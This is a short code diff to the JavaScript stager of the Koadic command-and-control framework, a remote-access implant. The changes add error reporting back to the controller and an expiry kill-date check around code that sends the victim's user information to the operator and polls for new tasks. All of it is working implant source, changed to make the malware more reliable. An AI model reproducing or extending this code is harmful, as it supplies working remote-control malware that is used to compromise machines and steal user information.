@@ -12,7 +12,11 @@ try
 
         Koadic.work.report(Koadic.user.info());
 
-        Koadic.work.fork("");
+        try {
+          Koadic.work.fork("");
+        } catch (e) {
+          Koadic.work.error(e)
+        }
         Koadic.exit();
     }
     else
@@ -26,14 +30,22 @@ try
 catch (e)
 {
     // todo: critical error reporting
+    Koadic.work.error(e);
 }
 
 function DoWork()
 {
+
+    var epoch = new Date().getTime();
+    var expire = parseInt(Koadic.EXPIRE);
+    if (epoch > expire)
+    {
+        return false;
+    }
+
     try
     {
         var work = Koadic.work.get();
-
         // 201 = x64 or x86
         // 202 = force x86
         if (work.status == 201 || work.status == 202)
